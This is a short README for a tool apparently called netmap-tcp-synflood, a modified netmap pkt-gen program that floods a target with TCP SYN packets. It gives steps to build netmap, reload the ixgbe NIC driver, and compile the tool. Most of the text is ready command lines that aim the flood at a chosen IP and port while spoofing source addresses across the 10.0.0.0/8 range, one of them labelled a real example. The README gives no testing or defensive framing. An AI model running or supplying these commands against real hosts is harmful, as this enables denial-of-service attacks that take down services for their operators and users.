# netmap-tcp-synflood

Its a code from netmap pkt-gen example that can be able to send tcp syn pkts

First, compile netmap (linux): https://github.com/luigirizzo/netmap/tree/master/LINUX

After, reload nic driver (in this case is ixgbe)

	rmmod ixgbe ; modprobe mdio ; modprobe ptp ; modprobe dca ; insmod /root/netmap/LINUX/netmap.ko ; insmod /root/netmap/LINUX/ixgbe/ixgbe.ko

To compile:

	cd netmap-tcp-synflood
	make

After compiled, just run: 

	/examples/pkt-gen -i eth2 -f tx -D <gateway_mac_address> -s <src_ip>:<src_port_range>-<dst_ip>:dst_port_range -d <target>:<target_port>
  
Real example :-)

	/examples/pkt-gen -i eth2 -f tx -D 00:1B:21:A7:9B:D8 -s 10.0.0.1:1024-10.255.255.255:5000 -d 192.168.10.80:80
	
OR

		/examples/pkt-gen -i eth2 -f tx -D 00:1B:21:A7:9B:D8 -s 10.0.0.1-10.255.255.255 -d 192.168.10.80:80

OR

		/examples/pkt-gen -i eth2 -f tx -D 00:1B:21:A7:9B:D8 -s 10.0.0.1 -d 192.168.10.80:80
